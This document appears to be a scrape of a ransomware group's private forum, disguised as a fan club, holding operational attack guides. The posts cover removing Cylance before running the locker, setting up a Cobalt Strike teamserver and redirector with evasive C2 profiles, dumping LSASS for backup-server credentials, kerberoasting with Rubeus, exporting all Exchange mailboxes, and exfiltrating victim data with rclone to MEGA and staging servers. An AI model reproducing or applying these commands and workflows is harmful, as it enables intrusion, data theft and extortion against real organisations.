+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+AV/EDR Systems »
+Cylance Protect
+
+Cylance Protect
+Rozetka · 1 · 25
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: February 14, 2021, 07:28:36 pm
+Recorded by
+
+Difficulty raising session
+Mount AnyDesk / Onion backdoor
+Anchor DLL not attaching
+Dump LSASS does not help (the output is empty)
+Palit advanced ip scanner
+Deleted via GUI + reboot
+
+The work goes like this - we drag the data through RDP (fiezilla / rclone / mega / etc), then an hour before the lock on several servers we delete the cylans and use the locker's EXEC from them and on other machines we turn on the batch file that turns off all DB services and we locate them through the network . profit.
+
+If Cylance did not come down, then we create a virtual machine on vSphere/Hyper-V/VmWare, connect it to the domain, log in from YES and locate...
+
+It may also work to connect your VPN to VPN BUT the speeds on VPN are usually very small (I do not recommend)
+« Last Edit: February 14, 2021, 07:31:40 pm by Rozetka »
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+AV/EDR Systems »
+Cylance Protect
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Frameworks »
+Cobalt Strike »
+TeamServer setup
+
+TeamServer setup
+asdf7f814vycfas 1 24
+« previous topic next topic »
+
+Pages: 1
+asdf7f814vycfas
+
+Users
+Member
+*
+2
+View Profile E-mail Private Message (Offline)
+
+: March 01, 2021, 04:37:44 pm
+Recorded by
+
+Requires 2 servers + domain:
+1) Ubuntu server, 16-24gb, 500gb sata
+2) Server (VPS) Ubuntu, 4gb, 50gb sata
+
+Setting up 2 strip server:
+-sudo apt-get update && apt-get upgrade
+-sudo apt-get install nginx
+We direct the purchased domain to the ip of the server.
+We make directories var/www/domain.com and create a config for the domain:
+sudo nano /etc/nginx/sites-available/domain.com:
+
+Code: [Highlight]
+
+server {
+listen 80 default_server;
+listen [::]:80 default_server; root /var/www/domain.com; index index.html; server_name domain.com www.domain.com;
+
+location / {
+	try_files $uri $uri/ =404;
+}
+}
+
+-ln -s /etc/nginx/sites-available/domain.com /etc/nginx/sites-enabled/domain.com
+Delete default configs in /etc/nginx/sites-available and /etc/nginx/sites-enabled
+-sudo systemctl restart nginx
+Get ssl:
+-sudo add-apt-repository ppa:certbot/certbot
+-sudo apt-get update
+-sudo apt-get install python-certbot-nginx
+-sudo systemctl reload nginx
+-sudo certbot --nginx -d domain.com -d www.domain.com
+-sudo certbot renew --dry-run
+-sudo systemctl restart nginx
+We register a traffic redirect:
+-iptables -I INPUT -p tcp -m tcp --dport 443 -j ACCEPT
+-iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 1_server_ip:443
+-iptables -t nat -A POSTROUTING -j MASQUERADE
+-iptables -I FORWARD -j ACCEPT
+-iptables -P FORWARD ACCEPT
+-sysctl net.ipv4.ip_forward=1
+-history -c
+   
+We go to 1 server with cobalt:
+-sudo apt-get update && apt-get upgrade
+-sudo apt-get install screen
+-sudo apt-get install default-jdk
+Copy Cobalt to the /root folder after changing the port to any in teamserver, then via ssh:
+-sudo chmod +x teamserver
+-sudo chmod +x c2lint
+Next, go to /etc/ssl and move the SSL files from that server:
+-openssl pkcs12 -export -in certificate.pem -inkey domain.com.key -out domain.com.p12 -name domain.com -passout pass:tYidn8
+-keytool -importkeystore -deststorepass tYidn8 -destkeypass tYidn8 -destkeystore domain.com.store -srckeystore domain.com.p12 -srcstoretype PKCS12 -srcstorepass tYidn8 -alias domain.com
+As a result of these commands, the domain.com.store file will appear, copy it to the /root/Cobalt folder
+We change our domain in xxxx.prorfile.
+-sudo ./c2lint xxxx.profile
+-sudo screen
+-cd /root/Cobalt
+-sudo ./teamserver ip password /root/Cobalt/xxxx.profile
+Exit screen ctrl+A then D
+-history -c
+   
+Thus, a bunch of 2 servers is configured, then we create a regular HTTPS listener and send a callback to domain.com
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Frameworks »
+Cobalt Strike »
+TeamServer setup
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Frameworks »
+Cobalt Strike »
+Generation of unique profiles
+
+Generation of unique profiles
+asdf7f814vycfas 1 27
+« previous topic next topic »
+
+Pages: 1
+asdf7f814vycfas
+
+Users
+Member
+*
+2
+View Profile E-mail Private Message (Offline)
+
+: March 01, 2021, 04:38:57 pm
+Recorded by
+
+https://fortynorthsecurity.com/blog/introducing-c2concealer
+https://github.com/FortyNorthSecurity/C2concealer
+https://bluescreenofjeff.com/2017-08-30-randomized-malleable-c2-profiles-made-easy
+
+1. Upload cobalt c2concealer to the server with the team server
+2. Go to c2concealer folder
+3. We give the rights to the installation script:
+-chmod u+x install.sh
+5. Install ./install.sh
+6. We generate a profile, for this we select any well-known domain, for example, amazon.com
+Further, there are options either to generate a single profile, as everyone had before, or a variable one, i.e. for each lifted listener, you can select different profiles.
+
+Single profile generation:
+-C2concealer --hostname google.com --variant 1
+Where "--variant 1" is the number of options in the profile, developers do not recommend changing this parameter to more than "5". In the SSL settings, select the keystore and specify the path to our store file (cobalt folder) and the profile is ready. It will appear in the c2concealer folder.
+
+Download and edit.
+
+set sleeptime "5000"; Sleep time in this context = 5s
+set jitter "10"; Flicker can be set from 0 to 50 any number in principle
+set host_stage "true"; Adding a value
+--------------------
+set dns_idle "188.122.161.205"; Gives random dns for dns beacon, you can put any ip open dns 8.8.8.8
+set dns_ttl "20"; Change to 20s
+--------------------
+We replace
+
+http-config {
+header "Server" "apache";
+}
+
+
+On (values of headers can be set to your own)
+
+http-config {
+set headers "Server, Content-Type, Cache-Control, Connection, X-Powered-By";
+header "Server" "Microsoft-IIS/8.5";
+header "Cache-Control" "max-age=1";
+header "Connection" "keep-alive";
+header "X-Powered-By" "ASP.NET";
+set trust_x_forwarded_for "true";
+--------------------
+set spawnto_x86 "%windir%\\syswow64\\wusa.exe"; Replace with the process you want to jump into after spawn
+set spawnto_x64 "%windir%\\sysnative\\wusa.exe"; Replace with the process you want to jump into after spawn
+--------------------
+We replace
+
+execute {
+createThread;
+RtlCreateUserThread;
+CreateRemoteThread;
+
+On the
+
+execute {
+createThread;
+CreateRemoteThread;
+RtlCreateUserThread;
+
+--------------------
+
+Be sure to check before launch:
+
+./c2lint profilename.profile
+
+Of the errors, only this should be:
+
+[%] [OPSEC] .host_stage is true. Your Beacon payload is available to anyone that connects to your server to request it. Are you OK with this?
+[!] .code-signer.keystore is missing. Will not sign executables and DLLs
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Frameworks »
+Cobalt Strike »
+Generation of unique profiles
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+Backup Solutions »
+ShadowProtect SPX (StorageCraft)
+
+ShadowProtect SPX (StorageCraft)
+cybercat · 1 · 25
+« previous topic next topic »
+
+Pages: 1
+cybercat
+
+Users
+Member
+*
+3
+View Profile E-mail Private Message (Offline)
+
+: March 01, 2021, 07:07:03 pm
+Recorded by
+
+Accessing a server with Shadow Protect SPX backups (StorageCraft)
+==
+1. We go via RDP to one of the servers, in my case it is a SQL server.
+2. on the desktop we see the icon of the ShadowProtect SPX software
+-> click on it
+3. gui opens (if it asks for credits, enter those under which you entered via RDP, or any other YES)
+4. On the left in the "Job Summary" block, we see a detailed description of the backup scheme
+in the "Name" field - the name of the backup of our server
+in the "Destination" field - the place WHERE our spx stores the backups, in the form of SERVA_BA_NAME (SHARE WITH BACKUP ON THIS SERVER)
+From our example, we can conclude that all backups are stored in a ball called StorageCraft, and folders with server backups are named after the name of the server itself.
+5. Knowing the name of the backup server, we want to get a better idea of its structure, first of all we get the balls with the command "cmd.exe> net view \\COH-DSS3 /ALL", in response we get "Error 5: Access Denied"
+6. There is no access, we try to knock with other accounts YES - the answer is the same - error n 5, it would be logical to assume that in order to access the server we need either local admin credits on this very server, or a special user account with dedicated rights
+7. Suppose that if this is a dedicated user, then it has a name similar to the software\function:
+iterate over logins with the occurrence of substrings (here we need to turn on fantasy):
+Storage
+Shadow
+Protect
+Craft
+SP
+SPX
+Backup
+BUUser
+ETC.
+then we do a search on ntds.dit (hashes.txt.ntds) to find the hash, in my case the search was successful and I found the user Humanity.local\SPAdmin (I think it’s clear that this is Shadow Protect Admin) and its hash ce31b806821bec116ba03132ab5b3138, BUT unfortunately the search on cmd5.org did not give any result, and I desperately need a clearpass. (If you have enough hash, then congratulations - you have reached the result)
+8. But if you still need a clearpass or you could not find a suitable user, we will understand that if the software somehow knocks on the server, then the credits are known to it, which means they could remain on the server.
+Trying to dump hashes
+I won’t describe in detail here how to do it, but you should try hashdump (and its legitimate analogues) and logonpasswords (and analogues)
+In my case, I used a mimic and dumped lsass, in which I found a clearpass from my SPAdmin account - kerberos:
+* Username : SPAdmin
+* Domain : COHBackup
+* Password : Backup!User
+(in my case, for some reason, the domain was not Humanity.local but COHBackup, although you can also knock on Humanity.local (replace with your own value))
+9. We go to the explorer, and open the necessary share "\\COH-DSS3\StorageCraft" through it, it asks me for credits, I enter COHBackup\SPAdmin and Backup!User and successfully get access
+10. Also in some grids there may be several backup servers, as an option to check this, this is to click on the Backup button in the upper left corner of the gui (immediately after File) then - Destinations -> and we will see what are the ways to save backups
+===
+I'm not sure if this method will work for everyone, but in my case it worked, good luck!
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+Backup Solutions »
+ShadowProtect SPX (StorageCraft)
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+General »
+Useful Telegram Channels And Groups
+
+Useful Telegram Channels And Groups
+Alter 3 53
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: March 05, 2021, 02:10:52 am
+Recorded by
+
+https://t.me/peass
+https://t.me/antichat
+https://t.me/thebugbountyhunter
+https://t.me/club1337
+https://t.me/infosec1
+https://t.me/RalfHackerChannel
+https://t.me/in51d3
+https://t.me/exploithacker
+https://t.me/Premium_Hacking
+https://t.me/DownloadCourse14
+https://t.me/ViperZCrew
+https://t.me/techpwnews
+https://t.me/cyb3rhunt3r
+https://t.me/cveNotify
+https://t.me/MalwareResearch
+https://t.me/BugCrowd
+https://t.me/itsecalert
+tg://join?invite=H_eE5BLOna5xr7PR28iqpg - APT Intelligence (invite only)
+
+Feel free to add if you find something interesting!
+
+Sargon
+
+Users
+Member
+*
+one
+View Profile E-mail Private Message (Offline)
+
+Answer #1 : March 05, 2021, 11:05:46 am
+Recorded by
+
+https://t.me/freedom_fox
+
+Kalinka
+
+Users
+Member
+*
+one
+View Profile E-mail Private Message (Offline)
+
+Answer #2 : March 23, 2021, 11:12:52 am
+Recorded by
+
+https://t.me/mis_team
+https://t.me/sudolib
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+General »
+Useful Telegram Channels And Groups
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+General »
+Useful Links and Websites
+
+Useful Links and Websites
+Alter 2 56
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: March 05, 2021, 03:19:17 am
+Recorded by
+
+Resources :
+https://book.hacktricks.xyz/ - a large collection of materials on pentest
+https://adsecurity.org/ - security resource for Active Directory environments
+https://www.insecure.in/ - a large collection of techniques/software/reminders
+https://www.hacking-tutorial.com/ - a large collection of techniques/software/reminders
+https://hackingvision.com/ - software, guides
+https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet - big cheat-sheet
+https://www.guru99.com/ethical-hacking-tutorials.html - guides
+https://www.hackingtutorials.org/ - guides
+https://infosecwriteups.com/ - collection of write-ups
+https://pentester.land/ - write-ups, cheat-sheets
+https://www.hackthebox.eu/ - collection of exercises
+https://0x00sec.org/ - community forum
+
+
+Technics :
+https://www.bordergate.co.uk/extracting-windows-credentials-using-native-tools/ - dump cred using native windows tools
+https://xakep.ru/2021/03/03/persistence-cheatsheet/ - persistence notes
+« Last Edit: March 05, 2021, 04:25:17 am by Alter »
+
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+Reply #1 on March 05, 2021, 07:32:13 pm
+Recorded by
+
+ired.team/
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+General »
+Useful Links and Websites
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+Backup Solutions »
+Altaro
+
+Altaro
+Rozetka · 1 · 17
+« previous topic next topic »
+
+Pages: 1
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+: March 10, 2021, 12:43:01 am
+Recorded by
+
+found credits in lsass
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Software and Technologies »
+Backup Solutions »
+Altaro
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Initial Access »
+Pulse Secure SSL-VPN
+
+Pulse Secure SSL-VPN
+Alter 1 28
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 05, 2021, 11:00:04 am
+Recorded by
+
+post
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Initial Access »
+Pulse Secure SSL-VPN
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Frameworks »
+Cobalt Strike »
+Cobalt Strike Enhancement Chain
+
+Cobalt Strike Enhancement Chain
+Alter 2 40
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: March 11, 2021, 03:27:37 am
+Recorded by
+
+Part of the ToolChain package. Contents in enhancement_chain.cna file
+Please leave feedback or requests here to add aliases and additional "lightweight" .cna scripts to the package.
+
+##AV_Query
+AV_Query command Scans the registry for installed antiviruses
+##upload
+Alternative version of the upload command.
+Uploads a local file (first argument) to a remote host (second argument, optional).
+How to use: __upload </local/path/to/file> [/remote/path/to/file]__.
+Usage example: __beacon> upload implant.exe \\DC1\c$\windows\temp\implant.exe__.
+##Blacklist
+Blacklist for bacons. Removes bacon if it is running on a computer where the username and computername are in the blacklist.
+__blacklist-add__ - add to blacklist
+__blacklist-remove__ - remove from blacklist
+__blacklist-show__ - show blacklist
+## Credpocalypse
+Tracks bacons and collects credentials
+Use in bacon:
+__begin_credpocalypse__ - keep track of the current bacon
+__end_credpocalypse [all]__ - stop tracking current/all bacons
+__credpocalypse_interval [time]__ - bacon polling interval 1m, 5m (default), 10m, 30m, 60m
+Usage in console script or other script:
+__begin_credpocalypse__ - track all bacons
+__end_credpocalypse [all]__ - stop tracking all bacons
+__credpocalypse_interval [time]__ - bacon polling interval 1m, 5m (default), 10m, 30m, 60m
+Right click on the bacon to open the Credpocalypse menu
+##powershell2
+Alternative version of powershell command with enhanced operational security
+## Simple Beacon console status bar
+Shows the working directory, change the width of the bacon last occurrence indicator in the lower right corner to a fixed one
+Adds an option to the cd command to return to the previous directory.
+Usage: __cd -__
+## dcom_shellexecute
+Lateral movement with DCOM (ShellExecute)
+Usage: __dcom_shellexecute [target] [listener]__ - create new bacon on target via DCOM ShellExecute object
+##DebugKit
+Additional debugging tools in the DebugKit pop-up menu, console script and in the bacon.
+Commands in the console script:
+__!beaconinfo__ - get information about bacons
+__!loaded_powershell__ - show loaded powershell cmdlets for each bacon
+__!c2_sample_server__ - show how responses from C2 server look like
+__!c2_sample_client__ - show what client requests look like
+__!who__ - show everyone who is connected to the teamserver
+__!pwn3d_hosts__ - show a list of hostnames that have ever created sessions
+__!show_data_keys__ - show keys in Cobalt Strike data model
+__!query_data_key <key_name>__ - get values by key from Cobalt Strike data model
+__!sync_all_downloads__ - synchronizes downloaded files from the Cobalt Strike server to the specified folder and recursively recreates the file paths that the files had on the target hosts
+Usage: __!sync_all_downloads [/path/on/client/machine/to/save/downloads/to] <IP address of host to download files for>__
+Commands in bacon console:
+__!iscsadmin__ - check current bacon via -isadmin function
+##csfm
+Query the database for known commands, provide helpful hints to the operator.
+Syntax: __csfm
+
+__ - enumeration of all csfm options
+Example: __search computer, tip ntlm__
+
+##EDR
+Remotely polls the system for EDR products
+Syntax: __edr_query [hostname] [arch]__
+## Color Coded Files Listing
+The script colorizes the output of the ls command and allows you to track downloaded files by highlighting them
+## Forwarded_Ports
+Keeps track of configured remote port forwardings on all bacons and makes it easy to remove them
+Using 'rportfwd' quickly consumes the pool of available local ports from which outgoing traffic is redirected, and keeping track of them manually becomes tedious on long-running projects. This script aims to fill that gap by collecting these commands and presenting them in a beautiful visualization panel.
+## HighLight_Beacons
+Highlights new beacons in green, inactive ones in red.
+## logvis
+Advanced beacon console output visualization.
+## MASS-DCSYNC
+DCSync attack applied to a list of domain users.
+The user list file must contain one user per line.
+##MIMIKATZ_ADDONS
+Performs a password change that allows you to change the NTLM password for this account.
+Uses the Mimikatz password change feature, which allows you to change the NTLM password for a given account without logging setpassword events.
+**Usage:** password_change [Username] [Known old hash or password] [New hash or password] [SERVER/DC/localhost]
+## PING_ALIASES
+1. alias **qping** sends a ping packet using the command line.
+**Usage**: qping [target]. The **target** parameter is optional.
+2. alias **smbscan** scans port 445.
+## PORTSCAN_RESULTS
+Menu item in the View section. When launched, a tab opens with the results of smbscan.
+##PROCESSCOLOR
+Highlighting process categories (antiviruses, explorer, browsers, current process) in the beacon process manager (Explore => ProcessList).
+## PS_WINDOW_ALIASES
+alias **pspane** opens the process manager.
+**Usage:** pspane
+## SLEEP_DOWN_WHEN_NO_OPERATORS
+Increases the sleep interval for beacons that do not have active (logged in) users.
+## SMART_AUTOPPID
+Redirects execution of beacon commands and all beacon jobs to a designated process (svchost.exe).
+All commands will be executed depending on the context/privilege (user or system).
+**Usage:** autoppid
+##WIN2012MIMIKATZ
+Adds a key to the registry for mimikatz to work.[/list]
+
+Last updated on 03/04/2021
+« Last Edit: March 11, 2021, 03:30:13 am by Alter »
+
+Rozetka
+
+Administrator
+Member
+*****
+35
+View Profile E-mail Private Message (Offline)
+
+Answer #1 : March 15, 2021, 01:53:02 am
+Recorded by
+
+Which of the modules is responsible for the fact that he massively puts sleep 300 without my demand? It gets in the way :-* :-* :-*
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Frameworks »
+Cobalt Strike »
+Cobalt Strike Enhancement Chain
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Credentials Dumping »
+We carry out a kerberoasting attack through vpn from a non-domain car, having vpn credits
+
+We carry out a kerberoasting attack through vpn from a non-domain car, having vpn credits
+cybercat · 1 · 35
+« previous topic next topic »
+
+Pages: 1
+cybercat
+
+Users
+Member
+*
+3
+View Profile E-mail Private Message (Offline)
+
+: March 16, 2021, 07:28:30 pm
+Recorded by
+
+
+```
+kerberoast remote from non-domain machine with domain user creds:
+1. Rubeus.exe kerberoast /dc:wesads15.wes.local /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt /creduser:domain.local\username /credpassword:UserPass!
+
+Asreproast remote from non-domain machine with domain user creds:
+2. Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt /dc:dc.domain.local /creduser:domain.local\username /credpassword:UserPass!
+```
+as you can see we do the same as in the normal attack, just add 3 new attributes:
+/dc: - specify the domain controller
+/creduser: - login of the domain user from which we are running
+/credpassword: - password of the domain user from which we are running
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Credentials Dumping »
+We carry out a kerberoasting attack through vpn from a non-domain car, having vpn credits
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Data Exfiltration »
+Backup of all MS Exchange mailboxes in one command
+
+Backup of all MS Exchange mailboxes in one command
+user5 1 13
+« previous topic next topic »
+
+Pages: 1
+user5
+
+Users
+Member
+*
+one
+View Profile E-mail Private Message (Offline)
+
+: May 20, 2021, 03:31:56 am
+Recorded by
+
+1) We are looking for a server where there is free space> 500gb (depending on the number of boxes on the network)
+2) Create a new folder for .pst files there
+3) We share it for the user Exchange Trusted Subsystem
+4) We give him the rights to Read / Write
+5) We go by rdp for ekzch server and run from Exchange management shell Administrator
+6) Then the same command: foreach ($mbx in (Get-Mailbox)){New-MailboxExportRequest -mailbox $mbx.alias -FilePath "\\Server\SharedFolder\$($mbx.Alias).pst"}
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Data Exfiltration »
+Backup of all MS Exchange mailboxes in one command
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Data Exfiltration »
+Rclone
+
+Rclone
+Alter 2 46
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 05, 2021, 11:30:36 am
+Recorded by
+
+1. download the program itself (laid out in general), create a file rclone.conf and put it in the same folder with exe
+2. then open cmd from the admin, fall into the folder where the program with the configuration file lies and execute the command: rclone config
+3. then a menu pops up in which we create a config (roughly speaking, we roll in mega credits), after the credits are rolled in, the program writes them to the rclone.conf file, in encrypted form.
+4. we take the received rclone.conf file and the program itself and put it on the host from which we are going to pull the information, of course it’s better to put it in a secluded place
+5. we fall into the folder where we put the config and the program and execute the command:
+
+shell rclone.exe copy "\\trucamtldc01\E$\Data" remote:Data -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12
+
+well, here I think it’s clear that what’s in quotes is what we’re extorting, we can specify it as you like, even the entire disk
+remote - the name of the config, which we specified when performing step 3, data - the folder in the mega where the info is uploaded
+
+credits go to @brandon
+« Last Edit: February 11, 2021, 02:12:19 am by Alter »
+
+giovanni
+
+Users
+Member
+*
+2
+View Profile E-mail Private Message (Offline)
+
+Reply #1 : February 18, 2021, 05:10:33 pm
+Recorded by
+
+Regulations for uploading data to grandfather using Rclone
+The process is built according to the following principle.
+For all users, a single Rclone configuration file is used, which is located in /var/www/rclone.conf.
+It collects all the remote, from where we download the data.
+We download only from our VPSok, or from other remote storages such as mega. Never pump directly from targets.
+Everyone connects via SSH under their own account, configures the remote (if it is not already configured), creates a new tmux session, and starts the copy process.
+
+Connecting via SSH
+Code: [Highlight]
+
+proxychains4 ssh USER@IP
+
+The first time you connect, you will be prompted to add a Fingerprint, enter "yes".
+USER - your username, for example looper.
+IP - grandfather's IP address.
+Next, enter the password.
+
+Adding a new remote
+Code: [Highlight]
+
+rclone --config /var/www/rclone.conf config
+
+First, let's see if the remote has already been added by someone else.
+We configure using the example of VPS with SFTP.
+Select "n) New remote", enter "n".
+As a name, we indicate a well-thought-out name, indicating whose VPSka and two extreme numbers of IP addresses without a dot, for example, rz16696.
+If we download from a mega, then we specify the name mega-EMAIL.
+EMAIL - the soap to which the mega account is registered, the part before "@".
+Next, specify the Storage type, for example sftp.
+Next, specify the host, i.e. From where we will download the IP address.
+Next, we specify user, the username on Storage from which we will extort, for example, root.
+Next, specify the port, usually this is the standard SSH connection port for SFTP, i.e. 22, it is selected by default, you can just press ENTER.
+The next step is the password, select "y) Yes type in my own password", enter "y", enter the password from the Storage user, then enter it again confirming it.
+The following values are for a more flexible configuration that is not required at this stage, so just press ENTER on them: key_pem, key_file.
+Next, select "n) No leave this optional password blank (default)", by entering "n", or simply press ENTER.
+Further, for pubkey_file, key_use_agent, use_insecure_cipher, disable_hashcheck, we also leave the standard value, just press ENTER.
+In standard situations, we do not need to edit the Advanced config, so select "n) No (default)", enter "n", or just press ENTER.
+We look at the result of the configuration, if everything is in order, then select “y) Yes this is OK (default)”, by entering “y”, or simply by pressing ENTER.
+Exit the configurator by selecting “q) Quit config”, enter “q”, press ENTER.
+
+Checking the created remote
+An optional step to make sure the remote is added correctly.
+Code: [Highlight]
+
+rclone --config /var/www/rclone.conf ls REMOTE:BUCKET
+
+REMOTE is the name of the remote, for example rz16696.
+BUCKET - path to files on the remote, for example /home/filterek.
+
+Create a tmux session
+Code: [Highlight]
+
+tmux new -s NAME
+
+NAME - session name, we call it according to the following principle. Case name (domain without domain zone, i.e. the part before the dot), then underscore _, what procedure (in our case, copy), underscore _, remote name (for example, rz16696). Final example: filterek_copy_rz16696.
+
+Start copying
+Code: [Highlight]
+
+rclone --config /var/www/rclone.conf -P copy REMOTE:BUCKET PATH -q --ignore-existing --auto-confirm
+
+REMOTE is the name of the remote, for example rz16696.
+BUCKET - path to files on the remote, for example /home/filterek.
+PATH - the path where to copy on the grandfather. Each user has his own folder, which is located in /var/www/USER_NAME/data, where USER_NAME is your username. We copy to this folder according to the following principle. First, the name of the case as in a rocket (a domain with a domain zone), for example filterek.com, then the name of the wheelbarrow from which the data was downloaded, for example ADMS-FILE, then the folder as they go structurally on the wheelbarrow from which we download. Final example: /var/www/looper/data/filterek.com/ADMS-FILE/Finance.
+After launching Rclone, we wait until it calculates all the files and starts displaying the download process.
+
+Disconnecting from a tmux session
+Press CTRL + B, then D.
+
+Disconnecting from SSH
+Disconnect from ssh with CTRL + D.
+
+Checking the download status
+We connect via ssh.
+Code: [Highlight]
+
+tmux ls
+
+We see a list of tmux sessions.
+
+We connect to the tmux session.
+Code: [Highlight]
+
+tmux a -t NAME
+
+NAME - tmux session name, for example filterek_copy_rz16696.
+We see the download process.
+
+After the download process is complete
+Upon completion of the download process, kill the tmux session.
+Code: [Highlight]
+
+tmux kill-session -t NAME
+
+NAME - tmux session name, for example filterek_copy_rz16696.
+
+tmux hint set
+https://gist.github.com/MohamedAlaa/2961058
+
+Brief Basics of SFTP
+For general information.
+https://www.digitalocean.com/community/tutorials/sftp-ru
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Data Exfiltration »
+Rclone
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Persistence »
+Anchor Backdoor
+
+Anchor Backdoor
+Alter 1 26
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
+: February 05, 2021, 11:31:42 am
+Recorded by
+
+Post
+
+Pages: 1
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Persistence »
+Anchor Backdoor
+
+Go to:
+ 
++ Quick response
+
+SMF 2.0.18 | SMF © 2020, Simple Machines
+Designed with by SychO
+
+
+
+
+================================================= ==============================
+
+vampire
+New themes
+New answers
+
+Start
+Help
+Search
+Profile
+Private messages
+Users
+
+Monica Bellucci Fan Club
+
+Monica Bellucci Fan Club »
+Kill Chain »
+Persistence »
+Exchange Webshell
+
+Exchange Webshell
+Alter 4 53
+« previous topic next topic »
+
+Pages: 1
+alter
+
+Administrator
+Member
+*****
+28
+View Profile Private Message (Offline)
+
